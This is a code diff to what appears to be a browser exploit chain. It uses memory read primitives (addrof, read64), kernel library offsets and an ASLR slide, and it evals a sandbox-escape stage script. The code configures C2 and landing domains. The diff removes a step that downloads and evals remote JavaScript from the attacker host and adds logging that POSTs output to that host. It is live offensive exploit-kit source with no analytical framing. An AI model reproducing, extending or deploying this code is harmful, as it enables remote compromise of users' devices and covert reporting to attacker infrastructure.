@@ -211,8 +211,24 @@ self[1] = boxed_arr;
     const begin = Date.now();
     while (Date.now() - begin < ms);
   }
+  let logStart = new Date().getTime();
+  let logEntryID = 0;
   function print(x, reportError = false, dumphex = false) {
-    dsNet.print(x, reportError, dumphex);
+    let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
+    if (!SERVER_LOG && !reportError) return;
+    const id = logEntryID++;
+    const line = dumphex ? ('#' + id + ' [HEX] ' + x) : ('#' + id + ' ' + out);
+    try { console.log('[log] ' + line); } catch(e) {}
+    try { self.postMessage({ type: 'log', text: line }); } catch(e) {}
+    
+    if (typeof host !== 'undefined' && host) {
+      try {
+        var mx = new XMLHttpRequest();
+        mx.open('POST', host + '/api/debug/logs', false);
+        mx.setRequestHeader('Content-Type', 'text/plain;charset=UTF-8');
+        mx.send(line);
+      } catch(e) {}
+    }
   }
   let signal_ptr;
   let read64_str = '\u4444'.repeat(0x10);
@@ -266,18 +282,6 @@ self[1] = boxed_arr;
           const slide = data.slide;
           host = data.desiredHost;
           SERVER_LOG = data.SERVER_LOG;
-          (function() {
-            try {
-              var xhr = new XMLHttpRequest();
-              xhr.open('GET', host + '/ds_net.js', false);
-              xhr.send(null);
-              if (xhr.responseText) (0, eval)(xhr.responseText);
-            } catch(e) {}
-          })();
-          if (typeof globalThis !== 'undefined' && globalThis.dsNet) {
-            globalThis.dsNet.init(host);
-            globalThis.dsNet.setServerLog(SERVER_LOG);
-          }
           self.CHANNEL_CODE = data.channelCode || "";
           self.C2_DOMAIN = data.c2Domain || "";
           self.LANDING_DOMAIN = data.landingDomain || "";
@@ -906,13 +910,7 @@ self[1] = boxed_arr;
           const fopen_mode_str = 'w';
           const fopen_mode_ptr = p.read64(p.read64(p.addrof(fopen_mode_str) + 8n) + 8n);
           function log(msg) {
-            if (true) {
-              const elapsed = parseInt(Date.now() - rce_begin);
-              const path = ("/(" + elapsed + ") ").padEnd(15) + msg.toString().replaceAll('/', '|') + '\0';
-              resolve_rope(path);
-              const path_ptr = p.read64(p.read64(p.addrof(path) + 8n) + 8n);
-              fcall(fopen, path_ptr, fopen_mode_ptr);
-            }
+            print(msg);  
           }
           offsets.libsystem_kernel__thread_terminate = p.slide + 0x1D3D6F244n;
           function suspend_worker(worker) {
@@ -928,8 +926,8 @@ self[1] = boxed_arr;
           const rce_end = Date.now();
           log(`-`.repeat(0x28));
           try {
-            // local version
-            const sbx0_script = getJS('ds_sbx0.js');
+            
+            const sbx0_script = getJS('sbx0.js');
             log("after get js");
             eval(sbx0_script);
         } catch (e) {
